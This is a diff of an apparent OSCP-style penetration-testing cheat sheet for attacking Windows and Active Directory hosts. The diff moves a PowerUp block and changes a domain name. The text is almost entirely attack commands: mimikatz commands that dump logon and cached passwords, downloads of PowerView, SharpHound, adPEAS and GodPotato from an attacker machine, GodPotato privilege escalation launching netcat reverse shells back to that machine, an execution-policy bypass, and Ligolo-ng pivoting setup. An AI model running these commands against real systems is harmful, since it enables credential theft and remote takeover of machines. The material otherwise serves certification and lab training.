@@ -8,12 +8,7 @@ sekurlsa::logonpasswords    // Dump logon passwords
 lsadump::cache      //dump cache stored passwords
 
 iwr -uri http://Kali-IP/powerview.ps1 -Outfile powerview.ps1    // Upload PowerView on a Windows target
-iwr -uri http://Kali-IP/PowerUp.ps1 -Outfile PowerUp.ps1         // Upload PowerUp on a Windows target
 
-//those three commands will run PowerUp tool and start for PE check.
-powershell -ep bypass    
-. .\PowerUp.ps1
-Invoke-AllChecks
 
 iwr -uri http://Kali-IP/ADenum.ps1 -Outfile ADenum.ps1    //Upload AD Enum on windows target
 iwr -uri http://Kali-IP/SharpHound.ps1 -Outfile SharpHound.ps1   //Upload AD Enum on SharpHound target
@@ -21,7 +16,7 @@ iwr -uri http://Kali-IP/SharpHound.ps1 -Outfile SharpHound.ps1   //Upload AD Enu
 iwr -uri http://Kali-IP/adPEAS.ps1 -Outfile adPEAS.ps1 //Upload adPEAS on windows target (adPEAS is an AD scanner)
 //run adPEAS
 Import-Module .\adPEAS.ps1
-Invoke-adPEAS -Domain oscp.exam -Force
+Invoke-adPEAS -Domain oscp.htb -Force
 
 
 ================================== NetCat ========================================
@@ -49,6 +44,13 @@ iwr -uri http://Kali-IP/GodPotato-NET2.exe -Outfile GodPotato-NET2.exe
 .\GodPotato-NET35.exe -cmd "C:\users\Public\nc64.exe Kali-IP 6666 -e cmd.exe"
 .\GodPotato-NET2.exe -cmd "C:\users\Public\nc64.exe Kali-IP 5555 -e cmd.exe"
 
+
+iwr -uri http://Kali-IP/PowerUp.ps1 -Outfile PowerUp.ps1         // Upload PowerUp on a Windows target
+
+//those three commands will run PowerUp tool and start for PE check.
+powershell -ep bypass    
+. .\PowerUp.ps1
+Invoke-AllChecks
 ================================== Pivoting with Ligolo-ng ========================================
 cd /home/kali/Desktop/adtools // step one change directory where is proxy located
 ip tuntap add user kali mode tun ligolo    // add ligolo interface to kali
